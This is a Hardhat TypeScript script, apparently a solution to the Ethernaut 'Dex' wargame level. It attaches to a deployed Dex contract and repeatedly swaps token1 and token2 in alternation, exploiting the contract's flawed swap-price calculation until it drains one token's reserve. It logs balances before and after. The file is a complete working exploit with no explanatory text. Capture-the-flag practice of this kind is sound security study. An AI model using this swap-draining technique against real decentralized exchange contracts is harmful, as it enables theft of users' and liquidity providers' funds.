import { ethers } from "hardhat";
import { Dex__factory } from "../typechain/factories/contracts/Dex.sol/Dex__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0xf3Fcc89057FF7e1fF6d7248496a9621FE7d42F55";
    let dex = new Dex__factory(signer).attach(instance_address);
    let token1 = await dex.token1();
    let token2 = await dex.token2();
    console.log("dex token1", await dex.balanceOf(token1, instance_address));
    console.log("dex token2", await dex.balanceOf(token2, instance_address));
    console.log("player token1", await dex.balanceOf(token1, signer.address));
    console.log("player token2", await dex.balanceOf(token2, signer.address));


    let tx = await dex.approve(instance_address, 1000);
    await tx.wait();

    let flag = true;
    let from = '';
    let to = '';
    while (true) {
        if (flag == true) {
            from = token1;
            to = token2;
            flag = false;
        }
        else {
            from = token2;
            to = token1;
            flag = true;
        }
        
        let amount = await dex.balanceOf(from, signer.address);
        let amount_receive = await dex.getSwapPrice(from, to, amount);
        let balance = await dex.balanceOf(to, instance_address);
        
        if (amount_receive.gt(balance)) {
            amount = await dex.balanceOf(from, instance_address);
            tx = await dex.swap(from, to, amount);
            await tx.wait();
            break;
        }
        tx = await dex.swap(from, to, amount);
        await tx.wait();
    }

    console.log("dex token1", await dex.balanceOf(token1, instance_address));
    console.log("dex token2", await dex.balanceOf(token2, instance_address));
    console.log("player token1", await dex.balanceOf(token1, signer.address));
    console.log("player token2", await dex.balanceOf(token2, signer.address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
